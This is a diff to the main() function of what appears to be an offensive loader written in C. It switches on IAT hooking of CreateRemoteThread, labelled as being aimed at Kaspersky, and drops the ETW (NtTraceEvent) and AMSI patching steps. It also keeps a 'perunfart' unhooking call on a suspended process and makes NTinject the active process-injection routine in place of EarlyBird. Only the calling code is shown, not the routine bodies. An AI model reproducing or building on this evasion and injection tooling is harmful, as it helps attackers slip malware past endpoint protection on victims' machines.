@@ -31,10 +31,15 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 
-	printf("/////////////////////////////////////////////// Patching NtTraceEvent //////////////////////////////////\n");
+	//printf("/////////////////////////////////////////////// Patching NtTraceEvent //////////////////////////////////\n");
 	//etwPatch();
+	 
+	printf("/////////////////////////////////////////////// IAT Hooking for Kaspersky //////////////////////////////////\n");
+	//Hookem((char*)"Kernel32.dll", (char*)"Sleep", (PROC)HookedSleep);
+	Hookem((char*)"Kernel32.dll", (char*)"CreateRemoteThread", (PROC)HookedCreateRemThr);
+	//MessageBoxA(NULL, "First message", "HOOKS", MB_OK);
 
-	printf("/////////////////////////////////////////////// Patching AMSI //////////////////////////////////\n");
+	//printf("/////////////////////////////////////////////// Patching AMSI //////////////////////////////////\n");
 	//amsiPatch();
 	//threadPool();not working:(
 	/// <summary>
@@ -50,10 +55,11 @@ int main(int argc, char* argv[])
 	printf("[+] Process created in suspended state with pid: %d\n", pi.dwProcessId);
 	perunfart(pi.hProcess);
 
-	printf("\n/////////////////////////////////////////////// EarlyBird //////////////////////////////////\n");
+	printf("\n/////////////////////////////////////////////// Injection //////////////////////////////////\n");
 	//earlybird(pi);
 	//ntTestInject();
-	//RemoteInject();
-
+	NTinject();
+	//Sleep(60000);
+	getchar();
 	return 0;
 }
